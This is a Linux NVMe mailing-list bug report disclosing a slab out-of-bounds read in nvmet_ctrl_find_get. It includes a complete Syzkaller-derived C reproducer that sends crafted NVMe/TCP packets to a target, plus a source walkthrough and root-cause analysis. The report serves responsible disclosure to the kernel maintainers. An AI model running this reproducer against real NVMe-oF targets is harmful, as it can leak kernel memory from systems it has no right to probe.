Return-Path: <linux-nvme-bounces+linux-nvme=archiver.kernel.org@lists.infradead.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from bombadil.infradead.org (bombadil.infradead.org [198.137.202.133])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 360B3C4332F
	for <linux-nvme@archiver.kernel.org>; Mon,  6 Nov 2023 13:38:04 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.infradead.org; s=bombadil.20210309; h=Sender:List-Subscribe:List-Help
	:List-Post:List-Archive:List-Unsubscribe:List-Id:Content-Transfer-Encoding:
	Content-Type:To:Subject:Message-ID:Date:From:MIME-Version:Reply-To:Cc:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=vu4irJsGQW/ZQaEGhCDEFa4SHlo35K0I8PC9AMYSlVs=; b=lfUsPfHqDN7to/1JwioKvhJhfZ
	Qz1a9TFEdhvLdzEr0DcUBadhNvajf/y9EfYh9Phep9zZBNKp8E0weRmHGd09r22V9poH5jbibOYVj
	ddmK3Ra8Au0/W21FOkCjfKxQ1iunvchonNNxtrB/YT5m56VIINepdNCpwcr7B/PHaZHOhc6TcIgvZ
	kkhBTLpjCiNSf09Y5HeuHtRZr+n/BwjPoI+TyK+C4l/RiwNUVO0510kIhzGSpqVawp0wd6ivLuwvx
	JN4YnP1yUfUMuSPz8sFkWWoe1NADFHvvI/IhZ9vjiCoSrd3OFJscAEFe49kJDYRas0J9oGzrzOCFc
	NUj5VE0g==;
Received: from localhost ([::1] helo=bombadil.infradead.org)
	by bombadil.infradead.org with esmtp (Exim 4.96 #2 (Red Hat Linux))
	id 1qzznj-00Gksq-0J;
	Mon, 06 Nov 2023 13:37:59 +0000
Received: from mail-ej1-x636.google.com ([2a00:1450:4864:20::636])
	by bombadil.infradead.org with esmtps (Exim 4.96 #2 (Red Hat Linux))
	id 1qzznf-00Gks7-1m
	for linux-nvme@lists.infradead.org;
	Mon, 06 Nov 2023 13:37:57 +0000
Received: by mail-ej1-x636.google.com with SMTP id a640c23a62f3a-9a6190af24aso675701266b.0
        for <linux-nvme@lists.infradead.org>; Mon, 06 Nov 2023 05:37:52 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1699277871; x=1699882671; darn=lists.infradead.org;
        h=content-transfer-encoding:to:subject:message-id:date:from
         :mime-version:from:to:cc:subject:date:message-id:reply-to;
        bh=vu4irJsGQW/ZQaEGhCDEFa4SHlo35K0I8PC9AMYSlVs=;
        b=fde0ipZ4Zf3rRu7uuz83ir08O5ZqYroiF0tJPu7gFNORixYgvVHy6eeUy9bijEhA4H
         +tEhCSlbeDndenGLDZyl+kszPxgSJ5WQDUIJuFEnJmMjRtnrwv86WYwSizEbL51J1R3J
         Kl3HdgFEP35wskqExcTM4IT72u2s3XUDFB0wUQeHK4VugHk5vF/TPK+mcv/hZnjZmpT7
         TWQ7M0uVrBWRkQ1PKxE4VMzvKm7tAlDMGVggOI9r29zVqhrybZQYtlB0gy149psjkTyX
         wfhGr1H+zSlNpiqCGtED00arlw7tVm+VTFqNahnGZ06CF/6FLdmc+uZudB0VWrZQf51E
         dZdw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1699277871; x=1699882671;
        h=content-transfer-encoding:to:subject:message-id:date:from
         :mime-version:x-gm-message-state:from:to:cc:subject:date:message-id
         :reply-to;
        bh=vu4irJsGQW/ZQaEGhCDEFa4SHlo35K0I8PC9AMYSlVs=;
        b=GTm59/6s3La9fN5Dgbt1HPZlDv0U5RoGrXG+kAWRE1puV2ZoWtUcZXO/vL27nVkhTC
         P8Qf8GFsNZwbsqWgdYPOi3YqfIWfUl482YSqReaqBFTl5Fw2I0/dnrMOpBbMOK9R9YBA
         IZ/9+1ky37Iikq1X8uqi2tBuyJ/VR5pRm7qPtTGnHUHK8yo25DqCiNcXlZKD9aTNc4wl
         r1LM1DnJbyU7Uhommk473fSm4lBpT7qF4OCbISQcCXlsJy640+jYEQibnPjgPFnaKKNg
         uK4gXQ81lqfpslPYzAJ35bGm5nfCAaoo32FA/LbEve469BqI9gsr0Z7q4cys01WKlHjq
         Z7tg==
X-Gm-Message-State: AOJu0YzUgeue85p1zuRnubFSiLMr1ajRl9zT3+w6zgCmWmysATpQazKz
	J2JFifbQWNuRDWKLAhOt/ugMcpA585Amq1r14k4wBAe0mkWCpIsl
X-Google-Smtp-Source: AGHT+IGwY5/oWqiw1wxMBBbbtzjM9Ambvm8OcX3iZxo0PQkLF9M9d6/4Euo/UNa6d2vheBkY1gliopnaRVNf9D2YyYY=
X-Received: by 2002:a17:907:3d89:b0:9ae:699d:8a2a with SMTP id
 he9-20020a1709073d8900b009ae699d8a2amr14074134ejc.5.1699277870826; Mon, 06
 Nov 2023 05:37:50 -0800 (PST)
MIME-Version: 1.0
From: Alon Zahavi <zahavi.alon@gmail.com>
Date: Mon, 6 Nov 2023 15:37:39 +0200
Message-ID: <CAK5usQuJ=-1wt5LxHnWtrS_3iOeG-TWy9D88WA1EHSVv+hUNJQ@mail.gmail.com>
Subject: [Bug Report] NVMe-oF/TCP - Slab OOB Read in `nvmet_ctrl_find_get`
To: linux-nvme@lists.infradead.org, Chaitanya Kulkarni <chaitanyak@nvidia.com>, 
	Sagi Grimberg <sagi@grimberg.me>, Christoph Hellwig <hch@lst.de>
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
X-CRM114-Version: 20100106-BlameMichelson ( TRE 0.8.0 (BSD) ) MR-646709E3 
X-CRM114-CacheID: sfid-20231106_053755_597495_353B888E 
X-CRM114-Status: GOOD (  16.99  )
X-BeenThere: linux-nvme@lists.infradead.org
X-Mailman-Version: 2.1.34
Precedence: list
List-Id: <linux-nvme.lists.infradead.org>
List-Unsubscribe: <http://lists.infradead.org/mailman/options/linux-nvme>,
 <mailto:linux-nvme-request@lists.infradead.org?subject=unsubscribe>
List-Archive: <http://lists.infradead.org/pipermail/linux-nvme/>
List-Post: <mailto:linux-nvme@lists.infradead.org>
List-Help: <mailto:linux-nvme-request@lists.infradead.org?subject=help>
List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-nvme>,
 <mailto:linux-nvme-request@lists.infradead.org?subject=subscribe>
Sender: "Linux-nvme" <linux-nvme-bounces@lists.infradead.org>
Errors-To: linux-nvme-bounces+linux-nvme=archiver.kernel.org@lists.infradead.org

# Bug Overview

## Bug Summary
A slab out-of-bounds read happens in`nvmet_ctrl_find_get` execution,
when reaching a `pr_warn()`.

## Bug Location
`drivers/nvme/target/core.c` in the function `nvmet_ctrl_find_get`.

## Bug Class
Kernel Information Leak

## Disclaimer:
This bug was found using Syzkaller with NVMe-oF/TCP added support.

# Technical Details

## In a Few Words
Due to a string initialization without checking for NULL terminator, a
later print of that string can cause a kernel info leak.
Although the bug can be triggered remotely, the info leak is local only.

## Reproducer
DISCLAIMER: This reproducer was generated by Syzkaller, with some
optimizations by me.
```
// autogenerated by syzkaller (https://github.com/google/syzkaller)

#define _GNU_SOURCE

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

uint64_t r[1] =3D {0xffffffffffffffff};

void loop(void)
{
  intptr_t res =3D 0;
  res =3D syscall(__NR_socket, /*domain=3D*/2ul, /*type=3D*/1ul, /*proto=3D=
*/0);
  if (res !=3D -1)
    r[0] =3D res;
  *(uint16_t*)0x20000100 =3D 2;
  *(uint16_t*)0x20000102 =3D htobe16(0x1144);
  *(uint32_t*)0x20000104 =3D htobe32(0xc0a8eb8b);
  syscall(__NR_connect, /*fd=3D*/r[0], /*addr=3D*/0x20000100ul, /*addrlen=
=3D*/0x10ul);

  *(uint8_t*)0x200001c0 =3D 0;
  *(uint8_t*)0x200001c1 =3D 0;
  *(uint8_t*)0x200001c2 =3D 0x80;
  *(uint8_t*)0x200001c3 =3D 0;
  *(uint32_t*)0x200001c4 =3D 0x80;
  *(uint16_t*)0x200001c8 =3D 0;
  *(uint8_t*)0x200001ca =3D 0;
  *(uint8_t*)0x200001cb =3D 0;
  *(uint32_t*)0x200001cc =3D 0;
  memcpy((void*)0x200001d0,
         "\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\=
xcf"
         "\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\=
xbf"
         "\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\=
x35"
         "\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\x86\xcf\=
xbf"
         "\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\=
x35"
         "\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\=
x86"
         "\xcf\xbf\x35\x86\x00\x00\x00\x00\x00\x00",
         112);
  syscall(__NR_sendto, /*fd=3D*/r[0], /*pdu=3D*/0x200001c0ul, /*len=3D*/0x8=
0ul,
          /*f=3D*/0ul, /*addr=3D*/0ul, /*addrlen=3D*/0ul);

  *(uint8_t*)0x20000000 =3D 5;
  *(uint8_t*)0x20000001 =3D 1;
  *(uint8_t*)0x20000002 =3D 0;
  *(uint8_t*)0x20000003 =3D 0x3f;
  *(uint32_t*)0x20000004 =3D 0xbb7;
  *(uint32_t*)0x20000008 =3D 0x7ff;
  *(uint16_t*)0x20000010 =3D 4;
  *(uint16_t*)0x20000012 =3D 0x81;
  *(uint16_t*)0x20000014 =3D 7;
  *(uint16_t*)0x20000016 =3D 5;
  *(uint64_t*)0x20000080 =3D 0x20000440;
  memcpy(
      (void*)0x20000440,
      "\x39\x1f\xcb\x1d\x48\xf0\x52\x9a\x1a\xed\x88\xfe\x10\xa6\x2b\xcd\xfe=
\xbd"
      "\x3c\x87\xb7\x2d\x35\x8d\xb3\x14\x80\xcf\x0e\x51\x27\x71\x7b\xc2\x39=
\x93"
      "\x1a\xa6\xce\xaf\xe2\x2a\x5a\x2f\x04\x06\x5f\x50\x32\x52\x04\xf0\x9a=
\x4b"
      "\xac\xcc\x0d\x73\x9e\xb9\x60\x52\x4b\xe8\x47\xca\x3e\x9c\xaa\xdd\x50=
\x7d"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      "AAAAAAAAAAAB"
      , 841);
  syscall(__NR_sendto, /*fd=3D*/r[1], /*pdu=3D*/0x20000000ul, /*len=3D*/0x8=
8ul,
          /*f=3D*/0ul, /*addr=3D*/0ul, /*addrlen=3D*/0ul);

  *(uint8_t*)0x200001c0 =3D 4;
  *(uint8_t*)0x200001c1 =3D 0;
  *(uint8_t*)0x200001c2 =3D 0x48;
  *(uint8_t*)0x200001c3 =3D 0;
  *(uint32_t*)0x200001c4 =3D 0x48;
  *(uint8_t*)0x200001c8 =3D 0x7f;
  *(uint8_t*)0x200001c9 =3D 0x40;
  *(uint16_t*)0x200001ca =3D 0;
  *(uint8_t*)0x200001cc =3D 1;
  memset((void*)0x200001cd, 0, 19);
  *(uint64_t*)0x200001e0 =3D 0;
  *(uint32_t*)0x200001e8 =3D 0x400;
  memcpy((void*)0x200001ec, "\x5f\x19\x6e", 3);
  *(uint8_t*)0x200001ef =3D 1;
  *(uint16_t*)0x200001f0 =3D 0;
  *(uint16_t*)0x200001f2 =3D 4;
  *(uint16_t*)0x200001f4 =3D 0;
  *(uint8_t*)0x200001f6 =3D 0;
  *(uint8_t*)0x200001f7 =3D 0;
  *(uint32_t*)0x200001f8 =3D 0;
  memset((void*)0x200001fc, 0, 12);
  syscall(__NR_sendto, /*fd=3D*/r[0], /*pdu=3D*/0x200001c0ul, /*len=3D*/0x8=
0ul,
          /*f=3D*/0ul, /*addr=3D*/0ul, /*addrlen=3D*/0ul);
  *(uint8_t*)0x200003c0 =3D 4;
  *(uint8_t*)0x200003c1 =3D 0;
  *(uint8_t*)0x200003c2 =3D 0x48;
  *(uint8_t*)0x200003c3 =3D 0;
  *(uint32_t*)0x200003c4 =3D 0x48;
  *(uint8_t*)0x200003c8 =3D 0;
  *(uint8_t*)0x200003c9 =3D 0;
  *(uint16_t*)0x200003ca =3D 0;
  *(uint32_t*)0x200003cc =3D 0;
  *(uint64_t*)0x200003d0 =3D 0;
  *(uint64_t*)0x200003d8 =3D 0;
  *(uint64_t*)0x200003e0 =3D 0;
  memcpy((void*)0x200003e8, "\x11\x25\xed", 3);
  memcpy((void*)0x200003eb, "\x19\x15\x2c\x6a", 4);
  *(uint8_t*)0x200003ef =3D 0;
  *(uint32_t*)0x200003f0 =3D 0;
  *(uint32_t*)0x200003f4 =3D 0;
  *(uint32_t*)0x200003f8 =3D 0;
  *(uint32_t*)0x200003fc =3D 0;
  *(uint32_t*)0x20000400 =3D 0;
  *(uint32_t*)0x20000404 =3D 0;
  syscall(__NR_sendto, /*fd=3D*/r[0], /*pdu=3D*/0x200003c0ul, /*len=3D*/0xf=
ffffe7aul,
          /*f=3D*/0ul, /*addr=3D*/0ul, /*addrlen=3D*/0ul);
}
int main(void)
{
  syscall(__NR_mmap, /*addr=3D*/0x1ffff000ul, /*len=3D*/0x1000ul, /*prot=3D=
*/0ul,
          /*flags=3D*/0x32ul, /*fd=3D*/-1, /*offset=3D*/0ul);
  syscall(__NR_mmap, /*addr=3D*/0x20000000ul, /*len=3D*/0x1000000ul, /*prot=
=3D*/7ul,
          /*flags=3D*/0x32ul, /*fd=3D*/-1, /*offset=3D*/0ul);
  syscall(__NR_mmap, /*addr=3D*/0x21000000ul, /*len=3D*/0x1000ul, /*prot=3D=
*/0ul,
          /*flags=3D*/0x32ul, /*fd=3D*/-1, /*offset=3D*/0ul);
  loop();
  return 0;
}
```

## In More Details
### Tracing The Bug

In the reproducer below, we send, in the first `sendto`, the ICReq
packet for the NVMe/TCP target. After that, we are sending another
=E2=80=9CFabric Command=E2=80=9D with the opcode 0x7f,
with some additional data. This additional data is 768 bytes that will
be later copied in the target to an SGL. The SGL=E2=80=99s data will later =
be
copied to an object of type `struct nvmf_connect_data` (Code Block 2)
during the execution of `nvmet_execute_io_connect` (Code Block 1).

Code Block 1:
```
static void nvmet_execute_io_connect(struct nvmet_req *req)
{
  ...

  struct nvmf_connect_data *d; // 1

  ...

  d =3D kmalloc(sizeof(*d), GFP_KERNEL);
  if (!d) {
    status =3D NVME_SC_INTERNAL;
    goto complete;
  }

  status =3D nvmet_copy_from_sgl(req, 0, d, sizeof(*d)); // 2
  if (status)
    goto out;

...

  ctrl =3D nvmet_ctrl_find_get(d->subsysnqn, d->hostnqn,
         le16_to_cpu(d->cntlid), req); // 3
  if (!ctrl) {
    status =3D NVME_SC_CONNECT_INVALID_PARAM | NVME_SC_DNR;
    goto out;
  }

...
}
```

Code Block 2:
```
struct nvmf_connect_data {
  uuid_t   hostid;
  __le16  cntlid;
  char      resv4[238];
  char      subsysnqn[NVMF_NQN_FIELD_LEN]; // NVMF_NQN_FIELD_LEN is 256
  char      hostnqn[NVMF_NQN_FIELD_LEN]; // NVMF_NQN_FIELD_LEN is 256
  char      resv5[256];
};
```

Code Block 1 Break Down:
1. The driver declares the variable d of type `struct
nvmf_connect_data` (See Code Block 2).
2. The driver uses `nvmet_copy_from_sgl` to copy the data from the SGL
to the variable `d`.
3. The driver calls the function `nvmet_ctrl_find_get` (Code block 3),
which will later on cause the slab OOB.

When filling `d`, The driver fills the entirety of d including
`subsysnqn`, `hostnqn`, and `resv5`. We know that `subsysnqn`,
`hostnqn` are supposed to be strings, but when filling `d`,
`nvmet_copy_from_sgl` ignores that fact and does not check if there is
a NULL terminator for those strings.

When the execution reaches the function `nvmet_ctrl_find_get`, if the
`nvmet_find_get_subsys` would not find the subsystem NQN, thus
returning 0, a warning would be printed, dereferencing `subsysnqn`
(which represents `d->subsysnqn`) as a string. Because we already know
that `d->subsysnqn` is not NULL terminated, the print operation will
overflow and will print `d->hostnqn` as well, and even overflow to
print `d->resv5`. The print will continue to overflow until the first
NULL will be reached. This behaviour will most likely cause an info
leak of kernel addresses, because `d` is allocated on the `kmalloc-1k`
slab cache, thus leaking the memory of the next object in the memory.

Code Block 3:
```
struct nvmet_ctrl *nvmet_ctrl_find_get(const char *subsysnqn,
      const char *hostnqn, u16 cntlid,
      struct nvmet_req *req)
{
struct nvmet_ctrl *ctrl =3D NULL;
struct nvmet_subsys *subsys;

subsys =3D nvmet_find_get_subsys(req->port, subsysnqn); // 1
if (!subsys) {
pr_warn("connect request for invalid subsystem %s!\\n", subsysnqn); // 2
req->cqe->result.u32 =3D IPO_IATTR_CONNECT_DATA(subsysnqn);
goto out;
}

  ...
}
```

Another thing to point out is the function `nvmf_connect_data_prep`.
There is an initialization there, in which both `subsysnqn` and
`hostnqn` are initialized using the strncpy with maximum size of
`NVMF_NQN_SIZE`, a macro for 223, the actual max length of an NQN
name.

Code Block 4:
```
// From `linux/include/nvme.h`

/* NQN names in commands fields specified one size */
#define NVMF_NQN_FIELD_LEN 256

/* However the max length of a qualified name is another size */
#define NVMF_NQN_SIZE 223
```

## Root Cause
As explained above, the root cause for this bug is the fact that there
are no NULL terminators to the strings in the object representing the
`struct nvmf_connect_data`.

